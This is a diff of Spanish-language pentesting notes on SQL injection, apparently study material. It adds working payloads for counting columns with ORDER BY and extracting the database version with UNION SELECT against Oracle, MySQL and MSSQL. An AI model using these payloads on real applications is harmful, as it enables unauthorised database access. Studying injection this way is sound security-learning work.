@@ -1,6 +1,4 @@
-## Payloads
-
-### Identificación de versión y motor de base de datos
+## Identificación de versión y motor de base de datos
 #### ORACLE
 Identificar el numero de columnas
 `' order by 5-- -`, debemos de ir cambiando el número hasta que veamos que cambia algo y ya no nos devuelve un error
@@ -12,5 +10,9 @@ Una vez ya hemos identificado las columnas debemos probar con un
 Para extraer la versión
 `' union select 'a',banner from v$version-- -`, nos devolverá toda la información de la base de datos
 
-
 #### MySQL y MSSQL
+Identificar el numero de columnas
+`'order by 5-- -`, debemos de ir cambiando el número hasta que veamos que cambia algo y ya no nos devuelve un error
+
+Una vez ya hemos identificado las columnas debemos probar con u
+`' union select 'a','b'-- -`
